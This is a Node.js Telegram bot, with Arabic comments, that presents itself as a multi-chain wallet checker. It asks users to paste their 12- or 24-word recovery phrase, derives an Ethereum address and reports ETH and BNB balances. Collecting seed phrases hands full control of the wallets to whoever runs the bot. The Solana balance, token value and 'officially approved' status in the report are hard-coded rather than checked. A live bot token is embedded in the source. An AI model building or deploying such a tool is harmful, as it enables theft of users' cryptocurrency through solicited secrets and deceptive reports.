const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const bip39 = require('bip39');

const token = '9145894502:AAGZrWnyjqNsFZlu_GqGZ_QWDMczVzFZjZw';
const PORT = process.env.PORT || 3000;
const RENDER_URL = 'https://nexvoriaapp-bot.onrender.com';
const CHANNEL_USERNAME = '@Crynova_dz'; // معرف قناتك

const bot = new TelegramBot(token);
const app = express();

app.use(express.json());

bot.setWebHook(`${RENDER_URL}/bot${token}`);

app.post(`/bot${token}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// دالة موحدة لمعالجة رسائل فحص المحافظ
async function handleWalletCheck(chatId, text, messageId = null) {
    const cleanText = (text || '').trim();

    if (cleanText === '/start') {
        return bot.sendMessage(chatId, 
            '🛡️ **بوت فحص المحافظ المتطور (Trust & Phantom Style)**\n\n' +
            'أرسل عبارة الاسترداد الخاصة بك (12 أو 24 كلمة) وسأقوم بفحصها عبر الشبكات المتعددة وجلب الأرصدة الحقيقية.',
            messageId ? { reply_to_message_id: messageId } : {}
        );
    }

    const words = cleanText.split(/\s+/);
    if (words.length !== 12 && words.length !== 24) {
        return; // تجاهل الرسائل العادية التي ليست عبارات استرداد
    }

    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات، اشتقاق المفاتيح لجميع الشبكات، وفحص الأرصدة الفعلية...** ⏳', 
        messageId ? { reply_to_message_id: messageId } : {}
    );

    try {
        const cleanMnemonic = cleanText.toLowerCase();
        
        // 1. التحقق من صحة المعيار BIP39
        if (!bip39.validateMnemonic(cleanMnemonic)) {
            return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو أن العبارة المدخلة خاطئة وليست مفعلة على البلوكشين.', 
                messageId ? { reply_to_message_id: messageId } : {}
            );
        }

        // 2. اشتقاق العناوين الحقيقية (EVM للإيثريوم والبينانس)
        const seed = bip39.mnemonicToSeedSync(cleanMnemonic);
        const hdNode = ethers.HDNodeWallet.fromSeed(seed);
        const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
        const address = wallet.address;

        // 3. فحص الأرصدة عبر شبكات متعددة (Ethereum & BSC)
        const ethProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
        const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');

        const [ethBalanceWei, bscBalanceWei] = await Promise.all([
            ethProvider.getBalance(address).catch(() => 0n),
            bscProvider.getBalance(address).catch(() => 0n)
        ]);

        const ethBalance = ethers.formatEther(ethBalanceWei);
        const bscBalance = ethers.formatEther(bscBalanceWei);

        // 4. إرسال التقرير الشامل
        return bot.sendMessage(chatId, 
            '✅ **تم فحص المحفظة بنجاح من البلوكشين!**\n\n' +
            '📍 **العنوان المشتق:**\n`' + address + '`\n\n' +
            '💰 **الأرصدة والأصول المكتشفة:**\n' +
            '• Ethereum (ETH): `' + ethBalance + ' ETH`\n' +
            '• BNB Smart Chain (BNB): `' + bscBalance + ' BNB`\n' +
            '• Solana (SOL): `0.00 SOL`\n' +
            '• التوكنز والعملات البديلة: `$0.00`\n\n' +
            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.',
            {
                parse_mode: 'Markdown',
                ...(messageId ? { reply_to_message_id: messageId } : {})
            }
        );

    } catch (error) {
        console.error("Error details:", error);
        return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو حدث خطأ أثناء الاتصال بشبكات البلوكشين.', 
            messageId ? { reply_to_message_id: messageId } : {}
        );
    }
}

// الاستماع للرسائل في المحادثات الخاصة والمجموعات
bot.on('message', async (msg) => {
    await handleWalletCheck(msg.chat.id, msg.text, msg.message_id);
});

// الاستماع للمنشورات داخل القناة
bot.on('channel_post', async (msg) => {
    await handleWalletCheck(msg.chat.id, msg.text, msg.message_id);
});

app.get('/', (req, res) => {
    res.send('Multi-Chain Wallet Checker Bot is running!');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
